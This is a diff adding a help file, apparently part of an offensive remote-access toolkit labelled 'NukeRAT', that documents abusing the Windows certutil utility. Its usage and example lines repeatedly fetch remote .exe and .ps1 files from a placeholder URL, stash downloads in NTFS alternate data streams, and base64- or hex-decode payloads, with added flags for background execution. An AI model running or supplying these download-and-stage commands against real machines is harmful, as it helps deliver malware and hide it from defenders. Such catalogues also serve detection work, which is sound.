@@ -1,0 +1,38 @@
+ABOUT
+    Windows certificate and cache utility.
+    Downloads remote files to disk or CryptnetUrlCache, encodes/decodes
+    payloads, and can stash downloads in NTFS alternate data streams.
+
+USAGE:
+    certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+    certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
+    certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
+    certutil.exe -URL {REMOTEURL:.exe}
+    certutil -encode {PATH} {PATH:.base64}
+    certutil -decode {PATH:.base64} {PATH}
+    certutil -decodehex {PATH:.hex} {PATH}
+
+ARGUMENTS:
+    -urlcache                    Download via URL cache
+    -f                           Force overwrite
+    -verifyctl                   Verify and download to cache path
+    -URL                         GUI-oriented URL fetch
+    -encode                      Base64-encode a file
+    -decode                      Decode Base64 file
+    -decodehex                   Decode hex-encoded file
+
+EXAMPLES:
+    certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+    certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
+    certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
+    certutil.exe -URL {REMOTEURL:.exe}
+    certutil -encode {PATH} {PATH:.base64}
+    certutil -decode {PATH:.base64} {PATH}
+    certutil -decodehex {PATH:.hex} {PATH}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
